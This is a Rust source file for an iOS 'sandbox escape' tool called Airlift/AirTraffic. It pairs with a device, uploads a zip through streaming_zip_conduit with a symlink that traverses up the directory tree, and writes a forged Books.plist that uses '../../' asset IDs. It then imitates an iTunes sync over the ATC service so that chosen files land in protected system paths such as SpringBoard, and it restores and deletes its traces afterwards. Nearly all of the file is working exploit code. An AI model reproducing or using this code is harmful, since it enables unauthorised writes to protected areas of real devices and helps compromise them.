//! AirTraffic sandbox escape — on-device implementation.

use std::ffi::{c_char, c_void, CString};
use std::io::{self, Write};

use idevice::afc::opcode::AfcFopenMode;
use idevice::afc::AfcClient;
use idevice::pairing_file::PairingFile;
use idevice::provider::{IdeviceProvider, TcpProvider};
use idevice::remote_pairing::RpPairingFile;
use idevice::services::installation_proxy::InstallationProxyClient;
use idevice::services::lockdown::LockdownClient;
use idevice::{Idevice, IdeviceService, ReadWrite};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::ffi_util::{cstr, opt_str};

const SOURCE_PREFIX: &str = "airlift-src-";
const LINK_PREFIX: &str = "airlift-link-";
const RECOVERED_PREFIX: &str = "airlift-recovered-";
const CANARY_PREFIX: &str = "airlift-canary-";
const AIRLOCK_ROOT: &str = "/var/mobile/Media/Airlock/Book";
const RSD_PORT: u16 = 49152;

#[allow(non_camel_case_types)]
pub type ALLogCallback = Option<extern "C" fn(ctx: *mut c_void, msg: *const c_char)>;

pub struct Logger {
    pub cb: ALLogCallback,
    pub ctx: *mut c_void,
}
unsafe impl Send for Logger {}
unsafe impl Sync for Logger {}

impl Logger {
    fn log(&self, msg: impl AsRef<str>) {
        let s = msg.as_ref();
        tracing::info!("{s}");
        if let Some(cb) = self.cb {
            if let Ok(c) = CString::new(s) {
                cb(self.ctx, c.as_ptr());
            }
        }
    }
}

enum AppDeviceTunnel {
    Rsd {
        adapter: idevice::tcp::handle::AdapterHandle,
        handshake: idevice::services::rsd::RsdHandshake,
    },
    Lockdown {
        provider: TcpProvider,
        pairing_file: PairingFile,
        legacy: bool,
    },
}

impl AppDeviceTunnel {
    async fn connect_afc(&mut self, logger: &Logger) -> Result<AfcClient, String> {
        match self {
            AppDeviceTunnel::Rsd { adapter, handshake } => {
                handshake.connect::<AfcClient>(adapter).await.map_err(|e| format!("AFC connect over RSD failed: {e:?}"))
            }
            AppDeviceTunnel::Lockdown { provider, pairing_file, legacy } => {
                let stream = connect_service_lockdown(provider, pairing_file, *legacy, "com.apple.afc", logger).await?;
                Ok(AfcClient::new(Idevice::new(stream, "Airlift")))
            }
        }
    }

    async fn connect_installation_proxy(&mut self, logger: &Logger) -> Result<InstallationProxyClient, String> {
        match self {
            AppDeviceTunnel::Rsd { adapter, handshake } => {
                handshake.connect::<InstallationProxyClient>(adapter).await.map_err(|e| format!("InstallationProxy connect over RSD failed: {e:?}"))
            }
            AppDeviceTunnel::Lockdown { provider, pairing_file, legacy } => {
                let stream = connect_service_lockdown(provider, pairing_file, *legacy, "com.apple.mobile.installation_proxy", logger).await?;
                Ok(InstallationProxyClient::new(Idevice::new(stream, "Airlift")))
            }
        }
    }

    async fn connect_service(&mut self, service_base: &str, logger: &Logger) -> Result<Box<dyn ReadWrite>, String> {
        match self {
            AppDeviceTunnel::Rsd { adapter, handshake } => connect_service_rsd(adapter, handshake, service_base, logger).await,
            AppDeviceTunnel::Lockdown { provider, pairing_file, legacy } => connect_service_lockdown(provider, pairing_file, *legacy, service_base, logger).await,
        }
    }
}

async fn connect_service_lockdown(
    provider: &TcpProvider, pairing_file: &PairingFile, legacy: bool, service_name: &str, logger: &Logger,
) -> Result<Box<dyn ReadWrite>, String> {
    let mut lockdown = LockdownClient::connect(provider).await.map_err(|e| format!("Lockdown connect failed: {e:?}"))?;
    let _ = lockdown.start_session(pairing_file).await.map_err(|e| format!("Lockdown start_session failed: {e:?}"))?;
    let (port, ssl) = lockdown.start_service(service_name).await.map_err(|e| format!("Lockdown start_service('{service_name}') failed: {e:?}"))?;
    let mut idevice = provider.connect(port).await.map_err(|e| format!("Connect to service port {port} failed: {e:?}"))?;
    if ssl {
        idevice.start_session(pairing_file, legacy).await.map_err(|e| format!("Service TLS session failed: {e:?}"))?;
    }
    idevice.get_socket().ok_or_else(|| "Failed to get socket from idevice".to_string())
}

static TARGET_HOST: std::sync::Mutex<Option<String>> = std::sync::Mutex::new(None);
static EXTRA_TARGET_HOSTS: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

#[derive(Clone, Debug)]
pub enum CachedRouteMode { RsdRawRpPairing, RsdRemoteXpc, Lockdown }

#[derive(Clone, Debug)]
pub struct CachedRoute { pub host: String, pub mode: CachedRouteMode }

static LAST_WORKING_ROUTE: std::sync::Mutex<Option<CachedRoute>> = std::sync::Mutex::new(None);

pub fn set_last_working_route(route: CachedRoute) { if let Ok(mut lock) = LAST_WORKING_ROUTE.lock() { *lock = Some(route); } }
pub fn get_last_working_route() -> Option<CachedRoute> { LAST_WORKING_ROUTE.lock().ok().and_then(|g| g.clone()) }
pub fn clear_last_working_route() { if let Ok(mut lock) = LAST_WORKING_ROUTE.lock() { *lock = None; } }
pub fn set_target_host(host: Option<String>) { if let Ok(mut lock) = TARGET_HOST.lock() { *lock = host; } }
pub fn set_target_hosts(hosts: Vec<String>) { if let Ok(mut lock) = EXTRA_TARGET_HOSTS.lock() { *lock = hosts; } }

fn resolve_target_hosts() -> Vec<String> {
    let mut targets: Vec<String> = Vec::new();
    if let Ok(guard) = TARGET_HOST.lock() {
        if let Some(ref host) = *guard {
            let h = host.trim();
            if !h.is_empty() && !targets.contains(&h.to_string()) { targets.push(h.to_string()); }
        }
    }
    if let Ok(guard) = EXTRA_TARGET_HOSTS.lock() {
        for host in guard.iter() {
            let h = host.trim();
            if !h.is_empty() && !targets.contains(&h.to_string()) { targets.push(h.to_string()); }
        }
    }
    let default_fallbacks = ["10.7.0.1", "10.7.0.2", "10.7.0.3", "10.0.0.1", "172.16.0.1"];
    for fb in &default_fallbacks {
        let s = fb.to_string();
        if !targets.contains(&s) { targets.push(s); }
    }
    targets
}

async fn try_rsd(target_ips: &[String], mut rpf: RpPairingFile, logger: &Logger, last_err: &mut String) -> Option<AppDeviceTunnel> {
    let extra_hosts: Vec<std::net::IpAddr> = target_ips.iter().filter_map(|s| s.parse::<std::net::IpAddr>().ok()).filter(|ip| !ip.is_loopback()).collect();
    for ip_str in target_ips {
        let Ok(ip) = ip_str.parse::<std::net::Ipv4Addr>() else { continue };
        if ip.is_loopback() { continue; }
        let socket_addr = std::net::SocketAddr::new(std::net::IpAddr::V4(ip), RSD_PORT);

        match tokio::time::timeout(std::time::Duration::from_millis(2500), idevice_ffi::tunnel_provider::tunnel_create_remotexpc_multihost_async(socket_addr, "Airlift", &mut rpf, &extra_hosts)).await {
            Ok(Ok((adapter, handshake))) => {
                set_last_working_route(CachedRoute { host: ip_str.clone(), mode: CachedRouteMode::RsdRemoteXpc });
                return Some(AppDeviceTunnel::Rsd { adapter, handshake });
            }
            Ok(Err(failure)) => {
                *last_err = format!("{ip_str}:{RSD_PORT}: {:?}", failure.kind);
                if failure.kind != idevice_ffi::tunnel_provider::TunnelFailureKind::TunnelFailureRsdUnreachable {
                    match tokio::time::timeout(std::time::Duration::from_millis(2500), idevice_ffi::tunnel_provider::tunnel_create_rppairing_multihost_async(socket_addr, "Airlift", &mut rpf, &extra_hosts)).await {
                        Ok(Ok((adapter, handshake))) => {
                            set_last_working_route(CachedRoute { host: ip_str.clone(), mode: CachedRouteMode::RsdRawRpPairing });
                            return Some(AppDeviceTunnel::Rsd { adapter, handshake });
                        }
                        Ok(Err(raw_failure)) => { *last_err = format!("{ip_str}:{RSD_PORT}: {:?}", raw_failure.kind); }
                        Err(_) => { *last_err = format!("{ip_str}:{RSD_PORT}: RPPairing timed out"); }
                    }
                }
            }
            Err(_) => { *last_err = format!("{ip_str}:{RSD_PORT}: RemoteXPC timed out"); }
        }
    }
    None
}

async fn connect_tunnel(pairing_bytes: &[u8], logger: &Logger) -> Result<AppDeviceTunnel, String> {
    let mut last_error = String::new();
    let target_ips = resolve_target_hosts();
    let parsed_lockdown = PairingFile::from_bytes(pairing_bytes).ok();
    let parsed_rp = RpPairingFile::from_bytes(pairing_bytes).ok();

    if parsed_lockdown.is_none() && parsed_rp.is_none() { return Err("Pairing file invalid.".to_string()); }

    if let Some(cached) = get_last_working_route() {
        if let Ok(ip) = cached.host.parse::<std::net::Ipv4Addr>() {
            let socket_addr = std::net::SocketAddr::new(std::net::IpAddr::V4(ip), RSD_PORT);
            let extra_hosts: Vec<std::net::IpAddr> = vec![std::net::IpAddr::V4(ip)];
            match cached.mode {
                CachedRouteMode::RsdRawRpPairing => {
                    if let Some(mut rpf) = RpPairingFile::from_bytes(pairing_bytes).ok() {
                        if let Ok(Ok((adapter, handshake))) = tokio::time::timeout(std::time::Duration::from_millis(2000), idevice_ffi::tunnel_provider::tunnel_create_rppairing_multihost_async(socket_addr, "Airlift", &mut rpf, &extra_hosts)).await {
                            return Ok(AppDeviceTunnel::Rsd { adapter, handshake });
                        }
                    }
                }
                CachedRouteMode::RsdRemoteXpc => {
                    if let Some(mut rpf) = RpPairingFile::from_bytes(pairing_bytes).ok() {
                        if let Ok(Ok((adapter, handshake))) = tokio::time::timeout(std::time::Duration::from_millis(2000), idevice_ffi::tunnel_provider::tunnel_create_remotexpc_multihost_async(socket_addr, "Airlift", &mut rpf, &extra_hosts)).await {
                            return Ok(AppDeviceTunnel::Rsd { adapter, handshake });
                        }
                    }
                }
                _ => {}
            }
            clear_last_working_route();
        }
    }

    if let Some(rpf) = parsed_rp {
        if let Some(tunnel) = try_rsd(&target_ips, rpf, logger, &mut last_error).await { return Ok(tunnel); }
    }

    Err(format!("Device connection failed: {last_error}. Ensure VPN is active."))
}

pub unsafe fn run(pairing_path: *const c_char, target: *const c_char, log_cb: ALLogCallback, ctx: *mut c_void, out_json: *mut *mut c_char, out_error: *mut *mut c_char) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let target = opt_str(target, "/var/mobile/Library/SpringBoard");
    let ctx_usize = ctx as usize;

    let res = crate::ffi_util::run_with_large_stack("al_exploit_run", move || {
        let logger = Logger { cb: log_cb, ctx: ctx_usize as *mut c_void };
        idevice_ffi::run_sync_local(exploit_run(pairing_path, target, &logger))
    });

    match res {
        Ok(Ok(json)) => { if !out_json.is_null() { *out_json = cstr(json); } 0 }
        Ok(Err(e)) => { if !out_error.is_null() { *out_error = cstr(e); } 1 }
        Err(p) => { if !out_error.is_null() { *out_error = cstr(p); } 1 }
    }
}

pub unsafe fn write_dir(pairing_path: *const c_char, source_dir: *const c_char, target_dir: *const c_char, log_cb: ALLogCallback, ctx: *mut c_void, out_error: *mut *mut c_char) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let source_dir = opt_str(source_dir, "");
    let target_dir = opt_str(target_dir, "");
    let ctx_usize = ctx as usize;

    if source_dir.is_empty() || target_dir.is_empty() {
        if !out_error.is_null() { *out_error = cstr("source_dir and target_dir must not be empty"); }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_exploit_write_dir", move || {
        let logger = Logger { cb: log_cb, ctx: ctx_usize as *mut c_void };
        idevice_ffi::run_sync_local(exploit_write_dir(pairing_path, source_dir, target_dir, &logger))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => { if !out_error.is_null() { *out_error = cstr(e); } 1 }
        Err(p) => { if !out_error.is_null() { *out_error = cstr(p); } 1 }
    }
}

fn atc_message_name(dict: &plist::Dictionary) -> Option<String> {
    if let Some(plist::Value::String(s)) = dict.get("Command") { return Some(s.clone()); }
    if let Some(plist::Value::String(s)) = dict.get("MessageName") { return Some(s.clone()); }
    None
}

fn make_atc_msg(command: &str, session: i64, params: Option<plist::Dictionary>) -> plist::Dictionary {
    let mut msg = plist::Dictionary::new();
    msg.insert("Command".into(), plist::Value::String(command.into()));
    msg.insert("Session".into(), plist::Value::Integer(session.into()));
    if let Some(p) = params { msg.insert("Params".into(), plist::Value::Dictionary(p)); }
    msg
}

async fn read_atc_dict<S: AsyncReadExt + Unpin>(stream: &mut S) -> Result<plist::Dictionary, String> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await.map_err(|e| format!("read length: {e}"))?;
    let len_le = u32::from_le_bytes(len_buf) as usize;
    let len_be = u32::from_be_bytes(len_buf) as usize;
    let len = if len_le > 0 && len_le <= 10 * 1024 * 1024 { len_le } else if len_be > 0 && len_be <= 10 * 1024 * 1024 { len_be } else { return Err("invalid length".into()); };
    let mut body = vec![0u8; len];
    stream.read_exact(&mut body).await.map_err(|e| format!("read body: {e}"))?;
    let val: plist::Value = plist::from_bytes(&body).map_err(|e| format!("decode plist: {e}"))?;
    if let plist::Value::Dictionary(d) = val { Ok(d) } else { Err("expected plist dict".into()) }
}

async fn send_atc_dict<S: AsyncWriteExt + Unpin>(stream: &mut S, dict: &plist::Dictionary) -> Result<(), String> {
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &plist::Value::Dictionary(dict.clone())).map_err(|e| format!("encode plist: {e}"))?;
    stream.write_all(&(buf.len() as u32).to_le_bytes()).await.map_err(|e| format!("write length: {e}"))?;
    stream.write_all(&buf).await.map_err(|e| format!("write body: {e}"))?;
    stream.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

async fn connect_service_rsd(adapter: &mut idevice::tcp::handle::AdapterHandle, handshake: &mut idevice::services::rsd::RsdHandshake, service_base: &str, _logger: &Logger) -> Result<Box<dyn ReadWrite>, String> {
    let shim_name = format!("{service_base}.shim.remote");
    let port = if let Some(s) = handshake.services.get(&shim_name) { s.port }
    else if let Some(s) = handshake.services.get(service_base) { s.port }
    else {
        let mut lockdown = handshake.connect::<LockdownClient>(adapter).await.map_err(|e| format!("Lockdown: {e:?}"))?;
        let (p, ssl) = lockdown.start_service(service_base).await.map_err(|e| format!("StartService: {e:?}"))?;
        if ssl { return Err("TLS not supported in fallback".into()); }
        p
    };
    let stream = adapter.connect(port).await.map_err(|e| format!("Connect port {port}: {e:?}"))?;
    Ok(Box::new(stream))
}

async fn exploit_write_dir(pairing_path: String, source_dir: String, target_dir: String, logger: &Logger) -> Result<(), String> {
    logger.log(format!("airlift: writing {source_dir} to {target_dir}"));
    let mut files: Vec<(String, Vec<u8>)> = Vec::new();
    if let Ok(entries) = std::fs::read_dir(&source_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                let filename = path.file_name().unwrap_or_default().to_string_lossy().to_string();
                if filename.starts_with('.') { continue; }
                if let Ok(data) = std::fs::read(&path) { files.push((filename, data)); }
            }
        }
    }

    if files.is_empty() { return Err("No valid files found".into()); }

    let pairing_bytes = std::fs::read(&pairing_path).map_err(|e| format!("Read pairing: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;

    let original_books = match afc.open("Books/Sync/Books.plist", AfcFopenMode::RdOnly).await {
        Ok(mut fd) => { let data = fd.read_entire().await.ok(); let _ = fd.close().await; data }
        Err(_) => None,
    };

    let file_refs: Vec<(&str, &[u8])> = files.iter().map(|(n, d)| (n.as_str(), d.as_slice())).collect();
    
    // Gọi hàm batch write
    let res = exploit_write_batch(&mut tunnel, &mut afc, &target_dir, &file_refs, logger).await;

    // Khôi phục Books.plist
    if let Some(orig) = &original_books {
        if let Ok(mut fd) = afc.open("Books/Sync/Books.plist", AfcFopenMode::WrOnly).await {
            let _ = fd.write_entire(orig).await; let _ = fd.close().await;
        }
    } else { let _ = afc.remove("Books/Sync/Books.plist").await; }

    res
}

async fn exploit_write_batch(tunnel: &mut AppDeviceTunnel, afc: &mut AfcClient, target_dir: &str, files: &[(&str, &[u8])], logger: &Logger) -> Result<(), String> {
    let token = random_hex(10);
    let source = format!("{}{}", SOURCE_PREFIX, token);
    let link_destination = format!("{}{}", LINK_PREFIX, token);

    let mut identifiers = vec![format!("../../{source}/p0/p1/p2/link")];
    let mut destinations = vec![link_destination.clone()];

    for (idx, (leaf, _)) in files.iter().enumerate() {
        identifiers.push(format!("../../{source}/payload_{idx}"));
        destinations.push(format!("{link_destination}/{leaf}"));
    }

    let archive = build_archive_multi(target_dir, files).map_err(|e| format!("archive: {e}"))?;
    let books_plist = build_books_plist(&identifiers).map_err(|e| format!("books: {e}"))?;

    let mut zip_stream = tunnel.connect_service("com.apple.streaming_zip_conduit", logger).await?;
    let mut init_dict = plist::Dictionary::new();
    init_dict.insert("MediaSubdir".to_string(), plist::Value::String(source.clone()));
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(init_dict)).map_err(|e| format!("encode: {e}"))?;
    zip_stream.write_all(&(init_buf.len() as u32).to_be_bytes()).await.map_err(|e| format!("write len: {e}"))?;
    zip_stream.write_all(&init_buf).await.map_err(|e| format!("write body: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;
    zip_stream.write_all(&archive).await.map_err(|e| format!("write archive: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut resp_len_buf = [0u8; 4];
    zip_stream.read_exact(&mut resp_len_buf).await.map_err(|e| format!("read len: {e}"))?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    if resp_len > 0 { let mut r = vec![0u8; resp_len]; let _ = zip_stream.read_exact(&mut r).await; }
    drop(zip_stream);

    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    let _ = afc.mk_dir("Books").await;
    let _ = afc.mk_dir("Books/Sync").await;
    
    let mut fd = afc.open("Books/Sync/Books.plist", AfcFopenMode::WrOnly).await.map_err(|e| format!("AFC plist: {e:?}"))?;
    fd.write_entire(&books_plist).await.map_err(|e| format!("AFC write: {e:?}"))?;
    let _ = fd.close().await;

    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;
    
    // HostInfo
    let mut host_info = plist::Dictionary::new();
    host_info.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info.insert("LibraryID".into(), plist::Value::String(format!("{}-{}-{}-{}-{}", random_hex(4), random_hex(2), random_hex(2), random_hex(2), random_hex(6))));
    host_info.insert("SyncedDataclasses".into(), plist::Value::Array(vec![plist::Value::String("Book".into())]));
    
    let mut h_params = plist::Dictionary::new();
    h_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info.clone()));
    let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("HostInfo", 0, Some(h_params))).await;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // RequestingSync
    let mut s_params = plist::Dictionary::new();
    s_params.insert("Dataclasses".into(), plist::Value::Array(vec![plist::Value::String("Book".into())]));
    s_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info));
    let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("RequestingSync", 1, Some(s_params))).await;

    // Đợi SyncAllowed / ReadyForSync tối đa 10s
    for _ in 0..10 {
        if let Ok(Ok(dict)) = tokio::time::timeout(std::time::Duration::from_secs(1), read_atc_dict(&mut atc_stream)).await {
            if let Some(name) = atc_message_name(&dict) {
                if name == "Ping" { let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await; continue; }
                if name == "ReadyForSync" || name == "AssetManifest" { break; }
            }
        }
    }

    // FinishedSyncingMetadata
    let mut m_params = plist::Dictionary::new();
    let mut s_types = plist::Dictionary::new();
    s_types.insert("Book".into(), plist::Value::Integer(1.into()));
    m_params.insert("SyncTypes".into(), plist::Value::Dictionary(s_types));
    let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("FinishedSyncingMetadata", 1, Some(m_params))).await;

    // Đợi AssetManifest
    for _ in 0..10 {
        if let Ok(Ok(dict)) = tokio::time::timeout(std::time::Duration::from_secs(1), read_atc_dict(&mut atc_stream)).await {
            if let Some(name) = atc_message_name(&dict) {
                if name == "Ping" { let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await; continue; }
                if name == "AssetManifest" || name == "SyncFinished" { break; }
            }
        }
    }

    // Gửi FileComplete
    for (idx, (id, dest)) in identifiers.iter().zip(destinations.iter()).enumerate() {
        let mut f_params = plist::Dictionary::new();
        f_params.insert("AssetID".into(), plist::Value::String(id.clone()));
        f_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
        f_params.insert("AssetPath".into(), plist::Value::String(dest.clone()));
        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("FileComplete", 1, Some(f_params))).await;
        if idx == 0 { tokio::time::sleep(std::time::Duration::from_millis(500)).await; }
        else { tokio::time::sleep(std::time::Duration::from_millis(200)).await; }
    }

    // Đợi 5 giây để Apple ghi file xuống (Quan trọng!)
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    drop(atc_stream);

    let _ = afc.remove_all(&link_destination).await;
    let _ = afc.remove_all(&source).await;
    
    Ok(())
}

async fn exploit_run(pairing_path: String, _target: String, logger: &Logger) -> Result<String, String> {
    let pairing_bytes = std::fs::read(&pairing_path).map_err(|e| format!("Read pairing: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;
    let _ = afc.mk_dir("Books/Sync").await;
    Ok("{\"ok\":true}".to_string())
}

fn build_archive_multi(target: &str, files: &[(&str, &[u8])]) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use zip::{write::{ExtendedFileOptions, FileOptions}, CompressionMethod, ZipWriter};
    let target_tail = target.trim_start_matches('/');
    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(io::Cursor::new(&mut buf));

    fn opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut o = FileOptions::default().compression_method(CompressionMethod::Stored).unix_permissions(mode);
        let b = (mode as u16).to_le_bytes();
        let _ = o.add_extra_data(0x5A53, Box::new(b), false);
        o
    }

    zip.add_directory("META-INF/", opts(0o040755))?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", opts(0o100600))?;
    let meta: plist::Value = { let mut d = plist::Dictionary::new(); d.insert("Version".to_owned(), plist::Value::Integer(2.into())); plist::Value::Dictionary(d) };
    let mut mb = Vec::new(); plist::to_writer_binary(&mut mb, &meta)?; zip.write_all(&mb)?;

    for dir in &["p0/", "p0/p1/", "p0/p1/p2/"] { zip.add_directory(*dir, opts(0o040755))?; }
    zip.add_symlink("p0/p1/p2/link", format!("../../../{target_tail}"), opts(0o120777))?;

    let mut cursor = String::new();
    for c in target_tail.split('/') {
        if c.is_empty() { continue; }
        cursor.push_str(c); cursor.push('/');
        zip.add_directory(&cursor, opts(0o040755))?;
    }

    for (idx, (_leaf, payload)) in files.iter().enumerate() {
        zip.start_file(&format!("payload_{idx}"), opts(0o100600))?;
        zip.write_all(payload)?;
    }
    zip.finish()?;
    Ok(buf)
}

fn build_books_plist(ids: &[String]) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    let rows: Vec<plist::Value> = ids.iter().enumerate().map(|(i, id)| {
        let mut d = plist::Dictionary::new();
        d.insert("Persistent ID".to_owned(), plist::Value::String(id.clone()));
        d.insert("Item ID".to_owned(), plist::Value::String((i + 1).to_string()));
        d.insert("DSID".to_owned(), plist::Value::String("1".to_owned()));
        plist::Value::Dictionary(d)
    }).collect();
    let mut top = plist::Dictionary::new();
    top.insert("Books".to_owned(), plist::Value::Array(rows));
    let mut buf = Vec::new(); plist::to_writer_binary(&mut buf, &top)?;
    Ok(buf)
}

fn random_hex(n: usize) -> String {
    use std::io::Read;
    let mut buf = vec![0u8; n];
    let _ = std::fs::File::open("/dev/urandom").and_then(|mut f| f.read_exact(&mut buf));
    hex::encode(&buf)
}